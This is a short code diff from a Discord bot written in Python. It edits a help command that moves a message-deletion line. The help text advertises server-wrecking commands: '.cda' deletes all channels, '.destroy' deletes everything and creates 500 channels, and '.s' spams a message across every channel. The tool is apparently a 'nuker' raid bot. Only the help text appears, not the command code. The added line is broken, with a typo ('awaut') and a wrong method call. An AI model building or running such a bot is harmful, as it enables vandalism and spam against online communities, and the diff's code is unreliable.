@@ -72,14 +72,14 @@ async def cda(ctx):
 
 @client.command()
 async def commands(ctx):
-  
-  await ctx.delete.message()
+ 
   embed=discord.Embed(title="Commands",timestamp= ctx.message.created_at,color=discord.Color.blue(),inline=False)
   embed.add_field(name="**.cda**",value="cda command for deleting all channels only", inline=False)
   embed.add_field(name="**.destroy (message)**",value="destroy command for deleting all and creating 500 channels ",inline=False)
   embed.add_field(name="**.s (message)**",value="s command for spam the bot will send your message in all channels in the guild",inline=False)
   embed.set_footer(text="developed by Saad.")
   
+  awaut ctx.delete.message() 
   await ctx.send(embed=embed)
 
 
